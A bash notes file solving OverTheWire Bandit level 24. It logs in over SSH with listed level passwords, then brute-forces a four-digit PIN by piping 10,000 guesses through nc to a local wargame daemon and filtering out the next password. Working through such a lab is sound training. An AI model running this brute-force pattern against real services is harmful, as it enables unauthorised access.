#!/usr/bin/env bash

# Autor: Daniel Benjamin Perez Morales
# GitHub: https://github.com/DanielPerezMoralesDev13
# Correo electrónico: danielperezdev@proton.me 

# Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
ssh bandit24@bandit.labs.overthewire.org -p 2220

cd $(mktemp -d)
touch script.sh
chmod u+x script.sh
nano script.sh

#!/usr/bin/env bash

for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done

./script.sh > dictionary.txt

wc -l dictionary.txt

cat dictionary.txt | nc localhost 30002 | grep -iEv "Wrong|Please" | head -n 2 | tail -n 1 | awk 'NF{print $NF}'

exit

# Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
ssh bandit25@bandit.labs.overthewire.org -p 2220
